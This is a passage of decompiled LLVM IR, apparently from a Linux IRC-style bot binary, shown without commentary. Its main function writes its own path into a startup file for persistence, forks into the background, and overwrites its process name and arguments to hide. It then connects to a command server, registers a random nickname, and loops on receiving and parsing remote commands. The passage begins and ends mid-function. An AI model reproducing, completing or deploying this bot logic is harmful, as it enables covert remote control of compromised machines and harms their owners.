dec_label_pc_9e5c:                                ; preds = %dec_label_pc_9e48, %dec_label_pc_9e10
  %v2_9e60 = load i32, i32* @global_var_23e68.355, align 4
  store i32 13, i32* @r2, align 4
  %v5_9e7c = call i32 @setsockopt(i32 %v2_9e60, i32 1, i32 13, i32 0, i32 0)
  %v2_9e84 = load i32, i32* @global_var_23e68.355, align 4
  store i32 2, i32* @r2, align 4
  %v5_9ea0 = call i32 @setsockopt(i32 %v2_9e84, i32 1, i32 2, i32 0, i32 0)
  %v2_9ea8 = load i32, i32* @global_var_23e68.355, align 4
  store i32 9, i32* @r2, align 4
  %v5_9ec4 = call i32 @setsockopt(i32 %v2_9ea8, i32 1, i32 9, i32 0, i32 0)
  store i32 %v3_9c64, i32* @fp, align 4
  ret i32 %v5_9ec4

dec_label_pc_9ecc:                                ; preds = %dec_label_pc_9e48
  %v0_9ecc = call i32 @__errno_location()
  %v1_9ed4 = inttoptr i32 %v0_9ecc to i32*
  %v2_9ed4 = load i32, i32* %v1_9ed4, align 4
  %v7_9ed8 = icmp eq i32 %v2_9ed4, 115
  br i1 %v7_9ed8, label %dec_label_pc_9ef4, label %dec_label_pc_9ee0

dec_label_pc_9ee0:                                ; preds = %dec_label_pc_9ecc
  %v0_9ee0 = call i32 @__errno_location()
  %v1_9ee8 = inttoptr i32 %v0_9ee0 to i32*
  %v2_9ee8 = load i32, i32* %v1_9ee8, align 4
  %v7_9eec = icmp eq i32 %v2_9ee8, 114
  br i1 %v7_9eec, label %dec_label_pc_9ef4, label %dec_label_pc_9f1c

dec_label_pc_9ef4:                                ; preds = %dec_label_pc_9ee0, %dec_label_pc_9ecc
  %v1_9ef8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_9efc

dec_label_pc_9efc:                                ; preds = %dec_label_pc_9dc4, %dec_label_pc_9ef4
  %v2_9f00 = call i32 @time(i32* null)
  %v2_9f10 = sub i32 %v2_9f00, %v2_9e00
  %tmp = icmp ult i32 %v2_9f10, 10
  br i1 %tmp, label %dec_label_pc_9e10, label %dec_label_pc_9f1c

dec_label_pc_9f1c:                                ; preds = %dec_label_pc_9ee0, %dec_label_pc_9efc
  store i32 0, i32* @global_var_23e70.364, align 4
  %v2_9f2c = load i32, i32* @global_var_23e68.355, align 4
  %v1_9f34 = call i32 @close(i32 %v2_9f2c)
  br label %dec_label_pc_9c70.backedge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 2, 0 }
  uselistorder i32 (i32)* @gethostbyname, { 2, 1, 3, 0 }
  uselistorder i32 (i32)* @inet_addr, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand, { 0, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_9f1c, { 1, 0 }
  uselistorder label %dec_label_pc_9efc, { 1, 0 }
  uselistorder label %dec_label_pc_9dc4, { 1, 0 }
  uselistorder label %dec_label_pc_9c70.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_9cc8, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-2712 = alloca i32, align 4
  %stack_var_-6808 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-398 = alloca i32, align 4
  %stack_var_-1688 = alloca i32, align 4
  %stack_var_-664 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40808, i32* %stack_var_-4, align 4
  %v2_9f64 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9f64, i32* @fp, align 4
  %v2_9f78 = ptrtoint i32* %stack_var_-24 to i32
  %v4_9fb8 = call i32 @fopen(i32 ptrtoint ([19 x i8]* @global_var_19ba8.366 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_19a94.302, i32 0, i32 0))
  %v2_9fc8 = icmp eq i32 %v4_9fb8, 0
  br i1 %v2_9fc8, label %dec_label_pc_9fd0, label %dec_label_pc_9fec

dec_label_pc_9fd0:                                ; preds = %entry
  %v4_9fe0 = call i32 @fopen(i32 ptrtoint ([13 x i8]* @global_var_19bbc.369 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_19a94.302, i32 0, i32 0))
  br label %dec_label_pc_9fec

dec_label_pc_9fec:                                ; preds = %entry, %dec_label_pc_9fd0
  %stack_var_-80.0 = phi i32 [ %v4_9fe0, %dec_label_pc_9fd0 ], [ %v4_9fb8, %entry ]
  %stack_var_-84.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19bbc.369, i32 0, i32 0), %dec_label_pc_9fd0 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_19ba8.366, i32 0, i32 0), %entry ]
  %v2_9ff0 = icmp eq i32 %stack_var_-80.0, 0
  br i1 %v2_9ff0, label %dec_label_pc_a180, label %dec_label_pc_9ff8

dec_label_pc_9ff8:                                ; preds = %dec_label_pc_9fec
  store i32 %v2_9f78, i32* @r2, align 4
  %v1_a008 = bitcast i8** %argv to i32*
  %v2_a008 = load i32, i32* %v1_a008, align 4
  %v1_a00c = inttoptr i32 %v2_a008 to i8*
  %v3_a010 = call i32 @strlen(i8* %v1_a00c)
  %v2_a024 = ptrtoint i32* %stack_var_-348 to i32
  %v2_a030 = call i32 @getcwd(i32 %v2_a024, i32 256)
  %tmp75 = bitcast i32* %stack_var_-348 to i8*
  store i32 ptrtoint ([2 x i8]* @global_var_19bcc.371 to i32), i32* @r1, align 4
  %v6_a040 = call i32 @strcmp(i8* %tmp75, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_19bcc.371, i32 0, i32 0))
  %v2_a048 = icmp eq i32 %v6_a040, 0
  br i1 %v2_a048, label %dec_label_pc_a178, label %dec_label_pc_a060

dec_label_pc_a054:                                ; preds = %dec_label_pc_a060
  %v1_a058 = add i32 %stack_var_-64.0, -1
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_9ff8, %dec_label_pc_a054
  %stack_var_-64.0 = phi i32 [ %v1_a058, %dec_label_pc_a054 ], [ %v3_a010, %dec_label_pc_9ff8 ]
  %v2_a070 = load i32, i32* %v1_a008, align 4
  %v2_a078 = add i32 %v2_a070, %stack_var_-64.0
  %v1_a07c = inttoptr i32 %v2_a078 to i8*
  %v2_a07c = load i8, i8* %v1_a07c, align 1
  %v7_a080 = icmp eq i8 %v2_a07c, 47
  br i1 %v7_a080, label %dec_label_pc_a088, label %dec_label_pc_a054

dec_label_pc_a088:                                ; preds = %dec_label_pc_a060
  %v2_a098 = load i32, i32* %v1_a008, align 4
  %v2_a0a0 = add i32 %v2_a098, %stack_var_-64.0
  %v2_a0a4 = ptrtoint i32* %stack_var_-664 to i32
  store i32 %v2_a0a4, i32* @r0, align 4
  %v5_a0b8 = call i32 @sprintf(i32 %v2_a0a4, i32 ptrtoint ([8 x i8]* @global_var_19bd0.373 to i32), i32 %v2_a024, i32 %v2_a0a0)
  %v1_a10c = inttoptr i32 %stack_var_-80.0 to i32*
  %v3_a0d4 = bitcast i32* %stack_var_-1688 to i8*
  br label %dec_label_pc_a108.outer

dec_label_pc_a0c0:                                ; preds = %dec_label_pc_a108
  %v4_a0d4 = call i32 @fgets(i8* %v3_a0d4, i32 1024, i32 %stack_var_-80.0)
  %v3_a0ec = call i32 @strcasecmp(i8* %v3_a0d4, i32 %v2_a0a4)
  %v2_a0f4 = icmp eq i32 %v3_a0ec, 0
  br i1 %v2_a0f4, label %dec_label_pc_a0fc, label %dec_label_pc_a108

dec_label_pc_a0fc:                                ; preds = %dec_label_pc_a0c0
  %v1_a100 = add i32 %stack_var_-60.0.ph, 1
  br label %dec_label_pc_a108.outer

dec_label_pc_a108.outer:                          ; preds = %dec_label_pc_a0fc, %dec_label_pc_a088
  %stack_var_-60.0.ph = phi i32 [ %v1_a100, %dec_label_pc_a0fc ], [ 0, %dec_label_pc_a088 ]
  br label %dec_label_pc_a108

dec_label_pc_a108:                                ; preds = %dec_label_pc_a108.outer, %dec_label_pc_a0c0
  %v2_a10c = call i32 @feof(i32* %v1_a10c)
  %v2_a114 = icmp eq i32 %v2_a10c, 0
  br i1 %v2_a114, label %dec_label_pc_a0c0, label %dec_label_pc_a11c

dec_label_pc_a11c:                                ; preds = %dec_label_pc_a108
  %v2_a120 = icmp eq i32 %stack_var_-60.0.ph, 0
  %v2_a12c = call i32 @fclose(i32* %v1_a10c)
  br i1 %v2_a120, label %dec_label_pc_a128, label %dec_label_pc_a180

dec_label_pc_a128:                                ; preds = %dec_label_pc_a11c
  %v4_a130 = ptrtoint i8* %stack_var_-84.0 to i32
  %v4_a138 = call i32 @fopen(i32 %v4_a130, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_19bd8.375, i32 0, i32 0))
  %v2_a148 = icmp eq i32 %v4_a138, 0
  br i1 %v2_a148, label %dec_label_pc_a180, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a128
  %v2_a15c = bitcast i32* %stack_var_-664 to i8*
  %v3_a15c = call i32 @fputs(i8* %v2_a15c, i32 %v4_a138)
  %v1_a164 = inttoptr i32 %v4_a138 to i32*
  %v2_a164 = call i32 @fclose(i32* %v1_a164)
  br label %dec_label_pc_a180

dec_label_pc_a178:                                ; preds = %dec_label_pc_9ff8
  %v1_a17c = inttoptr i32 %stack_var_-80.0 to i32*
  %v2_a17c = call i32 @fclose(i32* %v1_a17c)
  br label %dec_label_pc_a180

dec_label_pc_a180:                                ; preds = %dec_label_pc_a11c, %dec_label_pc_a128, %dec_label_pc_9fec, %dec_label_pc_a150, %dec_label_pc_a178
  %v0_a180 = call i32 @fork()
  %v2_a188 = icmp eq i32 %v0_a180, 0
  br i1 %v2_a188, label %dec_label_pc_a198, label %dec_label_pc_a190

dec_label_pc_a190:                                ; preds = %dec_label_pc_a180
  %v1_a194 = call i32 @exit(i32 0)
  br label %dec_label_pc_a198

dec_label_pc_a198:                                ; preds = %dec_label_pc_a180, %dec_label_pc_a190
  %v1_a1a8 = bitcast i8** %argv to i32*
  %v2_a1a8 = load i32, i32* %v1_a1a8, align 4
  store i32 %v2_a1a8, i32* @r4, align 4
  %v2_a1bc = load i32, i32* %v1_a1a8, align 4
  %v1_a1c0 = inttoptr i32 %v2_a1bc to i8*
  %v3_a1c4 = call i32 @strlen(i8* %v1_a1c0)
  %v0_a1cc = load i32, i32* @r4, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_19bdc.377 to i32), i32* @r1, align 4
  store i32 %v3_a1c4, i32* @r2, align 4
  %v4_a1d8 = call i32 @strncpy(i32 %v0_a1cc, i32 ptrtoint ([14 x i8]* @global_var_19bdc.377 to i32), i32 %v3_a1c4)
  br label %dec_label_pc_a258

dec_label_pc_a1e8:                                ; preds = %dec_label_pc_a258
  %v3_a1ec = mul i32 %storemerge14, 4
  %v2_a204 = add i32 %v3_a1ec, %tmp
  %v1_a208 = inttoptr i32 %v2_a204 to i32*
  %v2_a208 = load i32, i32* %v1_a208, align 4
  store i32 %v2_a208, i32* @r4, align 4
  %v2_a22c = load i32, i32* %v1_a208, align 4
  %v1_a230 = inttoptr i32 %v2_a22c to i8*
  %v3_a234 = call i32 @strlen(i8* %v1_a230)
  %v0_a23c = load i32, i32* @r4, align 4
  store i32 %v0_a23c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v3_a234, i32* @r2, align 4
  %v0_a248 = call i32 @memset()
  %v1_a250 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_a258

dec_label_pc_a258:                                ; preds = %dec_label_pc_a198, %dec_label_pc_a1e8
  %storemerge14 = phi i32 [ 1, %dec_label_pc_a198 ], [ %v1_a250, %dec_label_pc_a1e8 ]
  %v5_a270 = icmp slt i32 %storemerge14, %argc
  br i1 %v5_a270, label %dec_label_pc_a1e8, label %dec_label_pc_a274

dec_label_pc_a274:                                ; preds = %dec_label_pc_a258
  %v2_a278 = call i32 @time(i32* null)
  store i32 %v2_a278, i32* @r0, align 4
  %v0_a280 = call i32 @getpid()
  store i32 %v0_a280, i32* @r0, align 4
  %v2_a288 = xor i32 %v2_a278, %v0_a280
  store i32 %v2_a288, i32* @r4, align 4
  %v0_a28c = call i32 @getppid()
  %v0_a294 = load i32, i32* @r4, align 4
  %v2_a294 = add i32 %v0_a294, %v0_a28c
  %v1_a29c = call i32 @srand(i32 %v2_a294)
  %v1_a2a8 = call i32 @makestring(i32 %v1_a29c)
  %v2_a2b8 = ptrtoint i32* %stack_var_-398 to i32
  store i32 ptrtoint ([17 x i8]* @global_var_19b74.353 to i32), i32* @r1, align 4
  %v3_a2c4 = call i32 @strcpy(i32 %v2_a2b8, i32 ptrtoint ([17 x i8]* @global_var_19b74.353 to i32))
  %v2_a2d8 = bitcast i32* %stack_var_-398 to i8*
  %v3_a2d8 = call i32 @strcat(i8* %v2_a2d8, i32 %v1_a2a8)
  store i32 %v2_a2b8, i32* @global_var_23e64.326, align 4
  %v1_a2ec = call i32 @makestring(i32 %v3_a2d8)
  store i32 %v1_a2ec, i32* @global_var_23e5c.306, align 4
  %v1_a2fc = call i32 @makestring(i32 %v1_a2ec)
  store i32 %v1_a2fc, i32* @global_var_23e6c.382, align 4
  store i32 ptrtoint (i32* @global_var_19bec.385 to i32), i32* @global_var_23e7c.313, align 4
  store i32 ptrtoint (i32* @global_var_19bf0.388 to i32), i32* @global_var_23e78.336, align 4
  store i32 ptrtoint (i32* @global_var_19bf0.388 to i32), i32* @global_var_23e60.390, align 4
  store i32 0, i32* @global_var_23e70.364, align 4
  %v2_a398 = ptrtoint i32* %stack_var_-664 to i32
  %v2_a460 = ptrtoint i32* %stack_var_-408 to i32
  %v2_a670 = ptrtoint i32* %stack_var_-6808 to i32
  %v2_a6ac = add i32 %v2_9f78, -6784
  %v2_a764 = ptrtoint i32* %stack_var_-2712 to i32
  %v2_a818 = ptrtoint i32* %stack_var_-1688 to i32
  %v3_a8f0 = bitcast i32* %stack_var_-1688 to i8*
  %v3_a7ac = bitcast i32* %stack_var_-2712 to i16*
  br label %dec_label_pc_a33c

dec_label_pc_a33c:                                ; preds = %dec_label_pc_a664, %dec_label_pc_a3dc, %dec_label_pc_a8e0, %dec_label_pc_a274
  %v0_a33c = call i32 @con()
  %v2_a344 = load i32, i32* @global_var_23e68.355, align 4
  %v2_a34c = load i32, i32* @global_var_23e60.390, align 4
  %v4_a35c = call i32 @Send(i32 %v2_a344, i32 ptrtoint ([9 x i8]* @global_var_19bf4.394 to i32), i32 %v2_a34c)
  %v2_a364 = load i32, i32* @global_var_23e68.355, align 4
  %v2_a36c = load i32, i32* @global_var_23e64.326, align 4
  %v2_a374 = load i32, i32* @global_var_23e5c.306, align 4
  store i32 %v2_a374, i32* @lr, align 4
  %v4_a394 = call i32 @Send(i32 %v2_a364, i32 ptrtoint ([41 x i8]* @global_var_19c00.396 to i32), i32 %v2_a36c)
  br label %dec_label_pc_a398

dec_label_pc_a398:                                ; preds = %dec_label_pc_a620, %dec_label_pc_a69c, %dec_label_pc_a900, %dec_label_pc_a920, %dec_label_pc_a33c
  br label %dec_label_pc_a3ac

dec_label_pc_a3ac:                                ; preds = %dec_label_pc_a398, %dec_label_pc_a3ac
  %storemerge1527 = phi i32 [ 32, %dec_label_pc_a398 ], [ %v1_a3c8, %dec_label_pc_a3ac ]
  %stack_var_-44.026 = phi i32 [ %v2_a398, %dec_label_pc_a398 ], [ %v1_a3bc, %dec_label_pc_a3ac ]
  %v2_a3b4 = inttoptr i32 %stack_var_-44.026 to i32*
  store i32 0, i32* %v2_a3b4, align 4
  %v1_a3bc = add i32 %stack_var_-44.026, 4
  %v1_a3c8 = add nsw i32 %storemerge1527, -1
  %v2_a3d4 = icmp eq i32 %v1_a3c8, 0
  br i1 %v2_a3d4, label %dec_label_pc_a3dc, label %dec_label_pc_a3ac

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3ac
  %v2_a3e0 = load i32, i32* @global_var_23e68.355, align 4
  %v3_a3e4 = udiv i32 %v2_a3e0, 32
  %v3_a3f8 = mul nuw nsw i32 %v3_a3e4, 4
  %v2_a400 = add i32 %v3_a3f8, %v2_9f78
  %v2_a404 = add i32 %v2_a400, -640
  %v1_a408 = inttoptr i32 %v2_a404 to i32*
  %v2_a408 = load i32, i32* %v1_a408, align 4
  %v1_a414 = urem i32 %v2_a3e0, 32
  %v6_a41c = shl i32 1, %v1_a414
  %v2_a420 = or i32 %v2_a408, %v6_a41c
  store i32 %v2_a420, i32* %v1_a408, align 4
  store i32 1200, i32* %stack_var_-408, align 4
  %v2_a454 = load i32, i32* @global_var_23e68.355, align 4
  %v1_a458 = add i32 %v2_a454, 1
  %v5_a474 = call i32 @select(i32 %v1_a458, i32 %v2_a398, i32 0, i32 0, i32 %v2_a460)
  %tmp76 = icmp slt i32 %v5_a474, 1
  br i1 %tmp76, label %dec_label_pc_a33c, label %dec_label_pc_a60c.preheader

dec_label_pc_a60c.preheader:                      ; preds = %dec_label_pc_a3dc
  %v2_a610106 = load i32, i32* @global_var_234bc.295, align 4
  %v3_a618108 = icmp eq i32 %v2_a610106, 0
  br i1 %v3_a618108, label %dec_label_pc_a620, label %dec_label_pc_a490

dec_label_pc_a490:                                ; preds = %dec_label_pc_a600, %dec_label_pc_a60c.preheader
  %storemerge16115 = phi i32 [ %.pre133, %dec_label_pc_a600 ], [ 0, %dec_label_pc_a60c.preheader ]
  %v3_a494 = mul i32 %storemerge16115, 4
  %v2_a4a0 = load i32, i32* @global_var_23e80.297, align 4
  %v2_a4a4 = add i32 %v2_a4a0, %v3_a494
  %v1_a4a8 = inttoptr i32 %v2_a4a4 to i32*
  %v2_a4a8 = load i32, i32* %v1_a4a8, align 4
  %v3_a4b8 = call i32 @waitpid(i32 %v2_a4a8, i32 0, i32 1)
  %tmp77 = icmp slt i32 %v3_a4b8, 1
  %.pre133 = add i32 %storemerge16115, 1
  br i1 %tmp77, label %dec_label_pc_a600, label %dec_label_pc_a51c.preheader

dec_label_pc_a51c.preheader:                      ; preds = %dec_label_pc_a490
  %v2_a52085 = load i32, i32* @global_var_234bc.295, align 4
  %v3_a52887 = icmp ult i32 %.pre133, %v2_a52085
  %v2_a53488 = load i32, i32* @global_var_23e80.297, align 4
  %v1_a53889 = add i32 %v2_a53488, -4
  %v3_a54090 = mul i32 %.pre133, 4
  %v2_a54491 = add i32 %v1_a53889, %v3_a54090
  br i1 %v3_a52887, label %dec_label_pc_a4d8, label %dec_label_pc_a530

dec_label_pc_a4d8:                                ; preds = %dec_label_pc_a51c.preheader, %dec_label_pc_a4d8
  %v2_a54495 = phi i32 [ %v2_a544, %dec_label_pc_a4d8 ], [ %v2_a54491, %dec_label_pc_a51c.preheader ]
  %v3_a54094 = phi i32 [ %v3_a540, %dec_label_pc_a4d8 ], [ %v3_a54090, %dec_label_pc_a51c.preheader ]
  %v2_a53493 = phi i32 [ %v2_a534, %dec_label_pc_a4d8 ], [ %v2_a53488, %dec_label_pc_a51c.preheader ]
  %v1_a4cc92 = phi i32 [ %v1_a4cc, %dec_label_pc_a4d8 ], [ %.pre133, %dec_label_pc_a51c.preheader ]
  %v2_a504 = add i32 %v2_a53493, %v3_a54094
  %v1_a508 = inttoptr i32 %v2_a504 to i32*
  %v2_a508 = load i32, i32* %v1_a508, align 4
  %v2_a50c = inttoptr i32 %v2_a54495 to i32*
  store i32 %v2_a508, i32* %v2_a50c, align 4
  %v1_a4cc = add i32 %v1_a4cc92, 1
  %v2_a520 = load i32, i32* @global_var_234bc.295, align 4
  %v3_a528 = icmp ult i32 %v1_a4cc, %v2_a520
  %v2_a534 = load i32, i32* @global_var_23e80.297, align 4
  %v1_a538 = add i32 %v2_a534, -4
  %v3_a540 = mul i32 %v1_a4cc, 4
  %v2_a544 = add i32 %v1_a538, %v3_a540
  br i1 %v3_a528, label %dec_label_pc_a4d8, label %dec_label_pc_a51c.dec_label_pc_a530_crit_edge

dec_label_pc_a51c.dec_label_pc_a530_crit_edge:    ; preds = %dec_label_pc_a4d8
  br label %dec_label_pc_a530

dec_label_pc_a530:                                ; preds = %dec_label_pc_a51c.dec_label_pc_a530_crit_edge, %dec_label_pc_a51c.preheader
  %v2_a544.lcssa = phi i32 [ %v2_a544, %dec_label_pc_a51c.dec_label_pc_a530_crit_edge ], [ %v2_a54491, %dec_label_pc_a51c.preheader ]
  %v2_a54c = inttoptr i32 %v2_a544.lcssa to i32*
  store i32 0, i32* %v2_a54c, align 4
  %v2_a554 = load i32, i32* @global_var_234bc.295, align 4
  %v1_a558 = add i32 %v2_a554, -1
  store i32 %v1_a558, i32* @global_var_234bc.295, align 4
  %v3_a570 = mul i32 %v2_a554, 4
  store i32 %v3_a570, i32* @r0, align 4
  %v0_a578 = call i32 @malloc()
  %v2_a5d499 = load i32, i32* @global_var_234bc.295, align 4
  store i32 %v2_a5d499, i32* @r2, align 4
  %v3_a5dc101 = icmp eq i32 %v2_a5d499, 0
  br i1 %v3_a5dc101, label %dec_label_pc_a5e4, label %dec_label_pc_a590

dec_label_pc_a590:                                ; preds = %dec_label_pc_a530, %dec_label_pc_a590
  %storemerge18102 = phi i32 [ %v1_a5c8, %dec_label_pc_a590 ], [ 0, %dec_label_pc_a530 ]
  %v3_a594 = mul i32 %storemerge18102, 4
  %v2_a5a0 = add i32 %v3_a594, %v0_a578
  %v2_a5b4 = load i32, i32* @global_var_23e80.297, align 4
  %v2_a5b8 = add i32 %v2_a5b4, %v3_a594
  %v1_a5bc = inttoptr i32 %v2_a5b8 to i32*
  %v2_a5bc = load i32, i32* %v1_a5bc, align 4
  %v2_a5c0 = inttoptr i32 %v2_a5a0 to i32*
  store i32 %v2_a5bc, i32* %v2_a5c0, align 4
  %v1_a5c8 = add i32 %storemerge18102, 1
  %v2_a5d4 = load i32, i32* @global_var_234bc.295, align 4
  store i32 %v2_a5d4, i32* @r2, align 4
  %v3_a5dc = icmp ult i32 %v1_a5c8, %v2_a5d4
  br i1 %v3_a5dc, label %dec_label_pc_a590, label %dec_label_pc_a5d0.dec_label_pc_a5e4_crit_edge

dec_label_pc_a5d0.dec_label_pc_a5e4_crit_edge:    ; preds = %dec_label_pc_a590
  br label %dec_label_pc_a5e4

dec_label_pc_a5e4:                                ; preds = %dec_label_pc_a530, %dec_label_pc_a5d0.dec_label_pc_a5e4_crit_edge
  %v2_a5e8 = load i32, i32* @global_var_23e80.297, align 4
  %v1_a5f0 = call i32 @free(i32 %v2_a5e8)
  store i32 %v0_a578, i32* @global_var_23e80.297, align 4
  br label %dec_label_pc_a600

dec_label_pc_a600:                                ; preds = %dec_label_pc_a490, %dec_label_pc_a5e4
  %v2_a610 = load i32, i32* @global_var_234bc.295, align 4
  %v3_a618 = icmp ult i32 %.pre133, %v2_a610
  br i1 %v3_a618, label %dec_label_pc_a490, label %dec_label_pc_a620

dec_label_pc_a620:                                ; preds = %dec_label_pc_a600, %dec_label_pc_a60c.preheader
  %v2_a624 = load i32, i32* @global_var_23e68.355, align 4
  %v3_a628 = udiv i32 %v2_a624, 32
  %v3_a634 = mul nuw nsw i32 %v3_a628, 4
  %v2_a63c = add i32 %v3_a634, %v2_9f78
  %v2_a640 = add i32 %v2_a63c, -640
  %v1_a644 = inttoptr i32 %v2_a640 to i32*
  %v2_a644 = load i32, i32* %v1_a644, align 4
  %v1_a650 = urem i32 %v2_a624, 32
  %v6_a654 = lshr i32 %v2_a644, %v1_a650
  %v1_a658 = urem i32 %v6_a654, 2
  %v2_a65c = icmp eq i32 %v1_a658, 0
  br i1 %v2_a65c, label %dec_label_pc_a398, label %dec_label_pc_a664

dec_label_pc_a664:                                ; preds = %dec_label_pc_a620
  store i32 %v2_a624, i32* @r0, align 4
  store i32 %v2_a670, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_a684 = call i32 @recv(i32 %v2_a624, i32 %v2_a670, i32 4096, i32 0)
  %tmp78 = icmp slt i32 %v4_a684, 1
  br i1 %tmp78, label %dec_label_pc_a33c, label %dec_label_pc_a69c

dec_label_pc_a69c:                                ; preds = %dec_label_pc_a664
  %v2_a6b0 = add i32 %v2_a6ac, %v4_a684
  %v3_a6b0 = inttoptr i32 %v2_a6b0 to i8*
  store i8 0, i8* %v3_a6b0, align 1
  %v6_a6cc = call i32 @strtok(i32 %v2_a670, i32 ptrtoint (i32* @global_var_19c2c.400 to i32), i32 %v2_a6b0, i32 %v2_a670, i32 %v4_a684)
  %v2_a91830 = icmp eq i32 %v6_a6cc, 0
  br i1 %v2_a91830, label %dec_label_pc_a398, label %dec_label_pc_a920

dec_label_pc_a6dc:                                ; preds = %dec_label_pc_a920
  %v3_a6e0 = call i32 @filter(i8* nonnull %storemerge32)
  %v2_a6e8 = load i8, i8* %storemerge32, align 1
  %v7_a6ec = icmp eq i8 %v2_a6e8, 58
  br i1 %v7_a6ec, label %dec_label_pc_a70c, label %dec_label_pc_a798

dec_label_pc_a700:                                ; preds = %dec_label_pc_a724
  %v1_a704 = add i32 %storemerge23, 1
  br label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a6dc, %dec_label_pc_a700
  %storemerge23 = phi i32 [ %v1_a704, %dec_label_pc_a700 ], [ 0, %dec_label_pc_a6dc ]
  store i32 %storemerge23, i32* @r4, align 4
  %v3_a714 = call i32 @strlen(i8* %storemerge32)
  %v0_a71c = load i32, i32* @r4, align 4
  %v3_a71c = icmp ult i32 %v0_a71c, %v3_a714
  br i1 %v3_a71c, label %dec_label_pc_a724, label %dec_label_pc_a70c.dec_label_pc_a740_crit_edge

dec_label_pc_a70c.dec_label_pc_a740_crit_edge:    ; preds = %dec_label_pc_a70c
  %.pre = add i32 %storemerge23, %storemerge32.in
  %.pre33 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_a740

dec_label_pc_a724:                                ; preds = %dec_label_pc_a70c
  %v2_a730 = add i32 %storemerge23, %storemerge32.in
  %v1_a734 = inttoptr i32 %v2_a730 to i8*
  %v2_a734 = load i8, i8* %v1_a734, align 1
  %v7_a738 = icmp eq i8 %v2_a734, 32
  br i1 %v7_a738, label %dec_label_pc_a740, label %dec_label_pc_a700

dec_label_pc_a740:                                ; preds = %dec_label_pc_a724, %dec_label_pc_a70c.dec_label_pc_a740_crit_edge
  %v3_a754.pre-phi = phi i8* [ %.pre33, %dec_label_pc_a70c.dec_label_pc_a740_crit_edge ], [ %v1_a734, %dec_label_pc_a724 ]
  %v2_a74c.pre-phi = phi i32 [ %.pre, %dec_label_pc_a70c.dec_label_pc_a740_crit_edge ], [ %v2_a730, %dec_label_pc_a724 ]
  store i8 0, i8* %v3_a754.pre-phi, align 1
  %v1_a75c = add i32 %storemerge32.in, 1
  store i32 %v1_a75c, i32* @r1, align 4
  %v2_a770 = call i32 @strcpy(i32 %v2_a764, i32 %v1_a75c)
  %v1_a784 = add i32 %v2_a74c.pre-phi, 1
  store i32 %v1_a784, i32* @r1, align 4
  %v3_a790 = call i32 @strcpy(i32 %storemerge32.in, i32 %v1_a784)
  br label %dec_label_pc_a7b0

dec_label_pc_a798:                                ; preds = %dec_label_pc_a6dc
  store i32 %v2_a764, i32* @r3, align 4
  %v4_a7ac = call i32 @memcpy(i16* %v3_a7ac, i32 ptrtoint (i32* @global_var_19c30.402 to i32), i32 2)
  br label %dec_label_pc_a7b0

dec_label_pc_a7b0:                                ; preds = %dec_label_pc_a740, %dec_label_pc_a798
  br label %dec_label_pc_a7c8

dec_label_pc_a7bc:                                ; preds = %dec_label_pc_a7e0
  %v1_a7c0 = add i32 %storemerge20, 1
  br label %dec_label_pc_a7c8

dec_label_pc_a7c8:                                ; preds = %dec_label_pc_a7b0, %dec_label_pc_a7bc
  %storemerge20 = phi i32 [ 0, %dec_label_pc_a7b0 ], [ %v1_a7c0, %dec_label_pc_a7bc ]
  store i32 %storemerge20, i32* @r4, align 4
  %v3_a7d0 = call i32 @strlen(i8* %storemerge32)
  %v0_a7d8 = load i32, i32* @r4, align 4
  %v3_a7d8 = icmp ult i32 %v0_a7d8, %v3_a7d0
  br i1 %v3_a7d8, label %dec_label_pc_a7e0, label %dec_label_pc_a7c8.dec_label_pc_a7fc_crit_edge

dec_label_pc_a7c8.dec_label_pc_a7fc_crit_edge:    ; preds = %dec_label_pc_a7c8
  %.pre34 = add i32 %storemerge20, %storemerge32.in
  %.pre35 = inttoptr i32 %.pre34 to i8*
  br label %dec_label_pc_a7fc

dec_label_pc_a7e0:                                ; preds = %dec_label_pc_a7c8
  %v2_a7ec = add i32 %storemerge20, %storemerge32.in
  %v1_a7f0 = inttoptr i32 %v2_a7ec to i8*
  %v2_a7f0 = load i8, i8* %v1_a7f0, align 1
  %v7_a7f4 = icmp eq i8 %v2_a7f0, 32
  br i1 %v7_a7f4, label %dec_label_pc_a7fc, label %dec_label_pc_a7bc

dec_label_pc_a7fc:                                ; preds = %dec_label_pc_a7e0, %dec_label_pc_a7c8.dec_label_pc_a7fc_crit_edge
  %v3_a810.pre-phi = phi i8* [ %.pre35, %dec_label_pc_a7c8.dec_label_pc_a7fc_crit_edge ], [ %v1_a7f0, %dec_label_pc_a7e0 ]
  %v2_a808.pre-phi = phi i32 [ %.pre34, %dec_label_pc_a7c8.dec_label_pc_a7fc_crit_edge ], [ %v2_a7ec, %dec_label_pc_a7e0 ]
  store i8 0, i8* %v3_a810.pre-phi, align 1
  store i32 %storemerge32.in, i32* @r1, align 4
  %v3_a824 = call i32 @strcpy(i32 %v2_a818, i32 %storemerge32.in)
